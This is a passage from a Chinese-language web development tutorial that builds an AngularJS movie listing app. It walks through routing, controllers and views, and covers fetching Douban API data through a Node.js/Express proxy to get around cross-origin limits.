href="#/coming_soon"&gt;即将上映&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href="#/top250"&gt;Top250&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">          &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">        &lt;!-- 作用到当前视图 --&gt;</span><br><span class="line">        &lt;div ng-view <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main"</span>&gt;</span><br><span class="line">          &lt;!-- 每一页不同的部分 --&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;!-- 引包 --&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script src="node_modules/</span>angular/angular.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="</span>node_modules/angular-route/angular-route.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;!-- 页面中引入包 --&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="</span>in_theaters/<span class="built_in">module</span>.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="</span>coming_soon/<span class="built_in">module</span>.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="</span>top250/<span class="built_in">module</span>.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="</span>app.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>主模块： app.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 主模块加载其它模块，就可以使用别的模块中的控制器了</span></span><br><span class="line">angular.module(<span class="string">'movie.main'</span>, [<span class="string">'movie.in_theaters'</span>, <span class="string">'movie.comming_soon'</span>, <span class="string">'movie.top250'</span>, <span class="string">'movie.detail'</span>,])</span><br><span class="line">  <span class="comment">// 设置路由</span></span><br><span class="line">  .config([<span class="string">'$routeProvider'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$routeProvider</span>)</span>&#123;</span><br><span class="line">    $routeProvider</span><br><span class="line">      .when(<span class="string">'/in_theaters'</span>, &#123;</span><br><span class="line">        <span class="comment">// 渲染这个视图</span></span><br><span class="line">        templateUrl: <span class="string">'in_theaters/view.html'</span>,</span><br><span class="line">        <span class="comment">// 调这个控制器</span></span><br><span class="line">        controller: <span class="string">'InTheaterController'</span></span><br><span class="line">      &#125;)</span><br><span class="line">      .when(<span class="string">'/coming_soon'</span>,&#123;</span><br><span class="line">        templateUrl: <span class="string">'coming_soon/view.html'</span>,</span><br><span class="line">        controller: <span class="string">'ComingSoonController'</span></span><br><span class="line">      &#125;)</span><br><span class="line">      .when(<span class="string">'/top250'</span>,&#123;</span><br><span class="line">        templateUrl: <span class="string">'top250/view.html'</span>,</span><br><span class="line">        controller: <span class="string">'Top250Controller'</span></span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 是指跳转到当前路由了</span></span><br><span class="line">      .otherwise(&#123;</span><br><span class="line">        redirectTo: <span class="string">'/in_theaters'</span></span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;])</span><br></pre></td></tr></table></figure><blockquote><p>正在上映模块：/in_theaters/module.js</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">angular</span>) </span>&#123;</span><br><span class="line">  angular.module(<span class="string">'movie.in_theaters'</span>, [])</span><br><span class="line">    .controller(<span class="string">'InTheaterController'</span>, [<span class="string">'$scope'</span>,<span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">        $scope.title = <span class="string">'Loading...'</span>;</span><br><span class="line">      &#125;]);</span><br><span class="line">&#125;)(angular);</span><br></pre></td></tr></table></figure><blockquote><p>即将上映模块：/comming_soon/module.js</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">angular</span>) </span>&#123;</span><br><span class="line">  angular.module(<span class="string">'movie.comming_soon'</span>,[])</span><br><span class="line">  .controller(<span class="string">'ComingSoonController'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>)</span>&#123;</span><br><span class="line">      $scope.title = <span class="string">'即将上映'</span>;</span><br><span class="line">    &#125;]);</span><br><span class="line">&#125;)(angular);</span><br></pre></td></tr></table></figure><blockquote><p>top250 模块 /top250/module.js</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">angular</span>) </span>&#123;</span><br><span class="line">  angular.module(<span class="string">'movie.top250'</span>,[])</span><br><span class="line">  .controller(<span class="string">'Top250Controller'</span>, [<span class="string">'$scope'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">$scope</span>)</span>&#123;</span><br><span class="line">      $scope.title = <span class="string">'Top250'</span>;</span><br><span class="line">    &#125;]);</span><br><span class="line">&#125;)(angular);</span><br></pre></td></tr></table></figure><h3 id="四-、绑定假数据"><a href="#四-、绑定假数据" class="headerlink" title="(四)、绑定假数据"></a>(四)、绑定假数据</h3><p>主页面视图：static/index.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;!-- ... --&gt;</span><br><span class="line">  &lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">  &lt;body ng-app="movie.main"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;nav class="navbar navbar-inverse navbar-fixed-top" role="navigation"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;div class="container-fluid"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!-- ... --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div id="navbar" class="navbar-collapse collapse"&gt;</span></span><br><span class="line"><span class="regexp">          &lt;ul class="nav navbar-nav navbar-right"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;li&gt;&lt;a href="#"&gt;关于&lt;/</span>a&gt;&lt;/li&gt;</span><br><span class="line">          &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">          &lt;!-- 搜索功能 --&gt;</span></span><br><span class="line"><span class="regexp">          &lt;form ng-submit="search()" ng-controller="searchController" class="navbar-form navbar-right" &gt;</span></span><br><span class="line"><span class="regexp">            &lt;input type="text" ng-model="search_text" class="form-control" placeholder="Search..."&gt;</span></span><br><span class="line"><span class="regexp">          &lt;/</span>form&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/nav&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="container-fluid"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;div class="row"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-sm-3 col-md-2 sidebar"&gt;</span></span><br><span class="line"><span class="regexp">          &lt;!-- ng 指令是用来操作这个 ul 的，所以将指令加给它比较合适，指令这给主模块就可以了 --&gt;</span></span><br><span class="line"><span class="regexp">          &lt;ul class="nav nav-sidebar" movie-active&gt;</span></span><br><span class="line"><span class="regexp">            &lt;li class="active"&gt;&lt;a href="#/i</span>n_theaters<span class="string">"&gt;正在热映&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line">            &lt;li&gt;&lt;a href="#/coming_soon"&gt;即将上映&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href="#/top250"&gt;Top250&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">          &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">        &lt;div ng-view <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main"</span>&gt;</span><br><span class="line">          &lt;!-- 需要改变的内容 --&gt;</span><br><span class="line">        &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;!-- 页面中引入包 --&gt;</span></span><br><span class="line"><span class="regexp">    &lt;!-- ... --&gt;</span></span><br><span class="line"><span class="regexp">    &lt;script src="movie_detail/m</span>odule.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;script src="</span>app.js<span class="string">"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>其他模块视图：in_theaters/view.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 <span class="class"><span class="keyword">class</span></span>=<span class="string">"page-header"</span>&gt;&#123;&#123; title &#125;&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">&lt;div class="list-group"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;a ng-repeat="movie in movie_list.subjects track by $index" href="#/</span>subject/&#123;&#123;movie.id&#125;&#125;<span class="string">" class="</span>list-group-item<span class="string">" &gt;</span></span><br><span class="line"><span class="string">    &lt;div class="</span>media<span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>media-left<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;img ng-src="</span>&#123;&#123; movie.images.small &#125;&#125;<span class="string">" alt="</span>&#123;&#123; movie.alt &#125;&#125;<span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">      &lt;div class="</span>media-body<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;h4 class="</span>media-heading<span class="string">"&gt;&#123;&#123; movie.title &#125;&#125;&lt;/h4&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;类型：&#123;&#123; movie.genres.join('、') &#125;&#125; &lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;导演：&lt;span ng-repeat="</span>director <span class="keyword">in</span> movie.directors track by $index<span class="string">"&gt;&#123;&#123; director.name &#125;&#125; &#123;&#123; $last?"</span><span class="string">":"</span>、<span class="string">" &#125;&#125; &lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;主演：&lt;span ng-repeat="</span>cast <span class="keyword">in</span> movie.casts track by $index<span class="string">"&gt;&#123;&#123; cast.name &#125;&#125; &#123;&#123; $last?"</span><span class="string">":"</span>、<span class="string">" &#125;&#125; &lt;/span&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;总共：&#123;&#123; total &#125;&#125;条记录，第&#123;&#123; page &#125;&#125;/&#123;&#123; totalPage &#125;&#125;页&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;nav&gt;</span></span><br><span class="line"><span class="string">  &lt;ul class="</span>pager<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;li ng-class="</span>&#123;<span class="attr">disabled</span>:page === <span class="number">1</span>&#125;<span class="string">"&gt;&lt;a ng-click="</span>go(page<span class="number">-1</span>)<span class="string">" href="</span><span class="string">"&gt;上一页&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">    &lt;li ng-class="</span>&#123;<span class="attr">disabled</span>:page === totalPage&#125;<span class="string">"&gt;&lt;a ng-click="</span>go(page+<span class="number">1</span>)<span class="string">" href="</span><span class="string">"&gt;下一页&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">  &lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/nav&gt;</span></span><br></pre></td></tr></table></figure><h3 id="请求-API，将数据绑定到视图预备知识"><a href="#请求-API，将数据绑定到视图预备知识" class="headerlink" title="请求 API，将数据绑定到视图预备知识"></a>请求 API，将数据绑定到视图预备知识</h3><p>★★★★★★★★★★★★★★★★★★</p><h4 id="ng-中的-http-请求资源"><a href="#ng-中的-http-请求资源" class="headerlink" title="ng 中的 $http 请求资源"></a>ng 中的 $http 请求资源</h4><p>问题：豆瓣 API 不支持：<code>$htpp.jsonp(&#39;http://api.douban.com/v2/movie/in_theaters?count=5&amp;callback=JSON_CALLBACK&#39;)。</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">angular</span>) </span>&#123;</span><br><span class="line">  angular.module(<span class="string">'movie.in_theaters'</span>, [])</span><br><span class="line">    .controller(<span class="string">'InTheaterController'</span>, [<span class="string">'$scope'</span>, <span class="string">'$http'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, $http</span>) </span>&#123;</span><br><span class="line">      $scope.title = <span class="string">'Loading...'</span>;</span><br><span class="line">      $http</span><br><span class="line">        <span class="comment">// 跨域请求，直接用get 报错</span></span><br><span class="line">        <span class="comment">// .get('http://api.douban.com/v2/movie/in_theaters?count=5')</span></span><br><span class="line">        <span class="comment">// ng 中的 jsonp</span></span><br><span class="line">        .jsonp(<span class="string">'http://api.douban.com/v2/movie/in_theaters?count=5&amp;callback=JSON_CALLBACK'</span>)</span><br><span class="line">        <span class="comment">// URL 变成了：http://api.douban.com/v2/movie/in_theaters?count=5&amp;callback=angular.callbacks._0</span></span><br><span class="line">        <span class="comment">// 数据回来了，但是报了常见语法错误，</span></span><br><span class="line">        <span class="comment">// 返回的数据并没有拼接上： angular.callbacks._0，把里面的 . 改成下划线 _ 就可以拼接到数据前面了。</span></span><br><span class="line">        <span class="comment">// 原因是豆瓣 API 不支持，豆瓣 API 中只包含数字、字母、下划线，长度不大于 50</span></span><br><span class="line">        <span class="comment">// 解决：自己写一个 jsonp 方法</span></span><br><span class="line">        <span class="comment">// 另一种方法：前后端分离：用 node 来请求数据，把项目跑到 node 里面，完全不用考虑跨域。</span></span><br><span class="line">        <span class="comment">// node 做一个中间层，专门来做 UI 渲染</span></span><br><span class="line">        .then( <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  ]);</span><br><span class="line">&#125;)(angular);</span><br></pre></td></tr></table></figure><h4 id="前后端分离"><a href="#前后端分离" class="headerlink" title="前后端分离"></a>前后端分离</h4><p><img src="/images/前后端分离开发模型.png" alt="前后端分离"></p><p>a) 前后端分离</p><p>(1)、V + C 前端 视图 + 控制器<br>(2)、M 后台 操作数据库<br>(3)、C 可以实现加载任意 V，在 V 里通过 XMLHttpRequest 发送请求向，索取数据<br>(4)、C 靠JS、CSS、HTML 是不能实现的<br>(5)、为了实现 C 前端团队需要依赖于 Nodejs、PHP、Python 等后端语言<br>(6)、前后端分离可以实现前后端完全解藕，使得后端数据更加稳定统一<br>(7)、可能会引起跨域问题，解决办法：jsonp</p><p>b) 前后端不分离</p><p>1) V = 前端 C + M = 后端</p><blockquote><p>暴漏了 static 静态资源，所有的资源都可以直接访问</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>), path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="comment">// 走前台不需要后台路由</span></span><br><span class="line"><span class="comment">// app.get('/', funciton(req, res) &#123;</span></span><br><span class="line"><span class="comment">//   res.send('后台路由');</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"><span class="comment">// 由于 static 目录中有一个 index.html，当去访问 '/' 的时候，express 会自动将 static 目录下的 index.html 渲染</span></span><br><span class="line">app.use(experss.static(path.join(__dirname, <span class="keyword">static</span>)));</span><br><span class="line">app.listen(<span class="number">4000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Server is running at port 4000'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>node 不仅仅能作为一个服务器接收请求，还能主动去请求别人的服务器，完全不受跨域影响。让 Node 做一个中转层。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 node 发送请求</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="comment">// 不使用原生的 http，有更好的包 request 来解决</span></span><br><span class="line">http.get(<span class="string">'http://api.douban.com/v2/movie/in_theaters?count=5'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> rawData = <span class="string">''</span>;</span><br><span class="line">  res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> rawData += chunk</span><br><span class="line">  &#125;);</span><br><span class="line">  res.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.parse(rawData));</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="request-包"><a href="#request-包" class="headerlink" title="request 包"></a>request 包</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --save request</span><br></pre></td></tr></table></figure><p>★★★★★★★★★★★★★★★★★★</p><h3 id="五-、请求-API，将数据绑定到视图"><a href="#五-、请求-API，将数据绑定到视图" class="headerlink" title="(五)、请求 API，将数据绑定到视图"></a>(五)、请求 API，将数据绑定到视图</h3><blockquote><p>用 node 来请求数据，把项目跑到 node 里面，完全不用考虑跨域，node 做一个中间层，专门来做 UI 渲染。</p></blockquote><h4 id="安装-express"><a href="#安装-express" class="headerlink" title="安装 express"></a>安装 express</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install express request --save</span><br></pre></td></tr></table></figure><h4 id="Node-中转请求接口-app-js"><a href="#Node-中转请求接口-app-js" class="headerlink" title="Node 中转请求接口 app.js"></a>Node 中转请求接口 app.js</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> config = <span class="built_in">require</span>(<span class="string">'./config'</span>);</span><br><span class="line"><span class="keyword">var</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>);</span><br><span class="line"><span class="comment">// querystring.parse() 将查询字符串转成对象；querystring.stringify() 将对象转成查询字符串</span></span><br><span class="line"><span class="keyword">var</span> qstring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="comment">// 暴漏静态资源</span></span><br><span class="line"><span class="comment">// 由于 static 目录中有一个 index.html，所以访问 / 的时候，express 会自动将 static 目录下的 index.html 渲染</span></span><br><span class="line">app.use(express.static(config.staticPath));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'node_modules'</span>)));</span><br><span class="line"><span class="comment">// Node中转暴漏一个接口给前台</span></span><br><span class="line"><span class="comment">// app.get('/in_theaters', function(req, response, next) &#123;</span></span><br><span class="line"><span class="comment">//   // 从豆瓣 API 拿数据，使用 request 包，不使用原生的 http</span></span><br><span class="line"><span class="comment">//   request('https://api.douban.com/v2/movie/in_theaters', function(err, res, body) &#123;</span></span><br><span class="line"><span class="comment">//     if (err) &#123;</span></span><br><span class="line"><span class="comment">//       throw err;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     // 拿到数据，响应给前台请求</span></span><br><span class="line"><span class="comment">//     if (res.statusCode === 200) &#123;</span></span><br><span class="line"><span class="comment">//       response.send(body);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//   &#125;);</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"><span class="comment">// 上面这种方式可以变成下面这种方式：</span></span><br><span class="line"><span class="comment">// Request 请求到的数据就是一个可读流，可以通过 pipe 管道顺着可读流发送数据</span></span><br><span class="line"><span class="comment">// app.get('/in_theaters', function (req, res, next) &#123;</span></span><br><span class="line"><span class="comment">//   // 拿到了查询字符串</span></span><br><span class="line"><span class="comment">//   // console.log(req.query);</span></span><br><span class="line"><span class="comment">//   request(`https://api.douban.com/v2/movie/in_theaters?$&#123;qstring.stringify(req.query)&#125;`).pipe(res);</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line"><span class="comment">// 获得所有页面的数据</span></span><br><span class="line">app.get(<span class="string">'/movie/:category'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 拿到了查询字符串，req.query 是一个对象</span></span><br><span class="line">  <span class="comment">// console.log(req.query); </span></span><br><span class="line">  <span class="comment">// qstring.stringify() 将一个对象转成查询字符串</span></span><br><span class="line">  request(<span class="string">`https://api.douban.com/v2/movie/<span class="subst">$&#123;req.params.category&#125;</span>?<span class="subst">$&#123;qstring.stringify(req.query)&#125;</span>`</span>).pipe(res);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 后台请求 电影条目 API 接口</span></span><br><span class="line">app.get(<span class="string">'/movie/subject/:id'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  request(<span class="string">`https://api.douban.com/v2/movie/subject/<span class="subst">$&#123;req.params.id&#125;</span>`</span>).pipe(res);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 监听端口</span></span><br><span class="line">app.listen(config.port, config.host, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server is running at port <span class="subst">$&#123;config.port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="主模块-app-js"><a href="#主模块-app-js" class="headerlink" title="主模块 app.js"></a>主模块 app.js</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">// 主模块加载其它模块，就可以使用别的模块中的控制器了</span><br><span class="line">angular.module(&apos;movie.main&apos;, [&apos;movie.in_theaters&apos;, &apos;movie.comming_soon&apos;, &apos;movie.top250&apos;, &apos;movie.detail&apos;,&apos;ngRoute&apos; ])</span><br><span class="line">  // 设置路由</span><br><span class="line">  .config([&apos;$routeProvider&apos;, function($routeProvider)&#123;</span><br><span class="line">    $routeProvider</span><br><span class="line">      // 请求首页时</span><br><span class="line">      .when(&apos;/&apos;, &#123;</span><br><span class="line">        redirectTo: &apos;/in_theaters/1&apos;</span><br><span class="line">      &#125;)</span><br><span class="line">      // 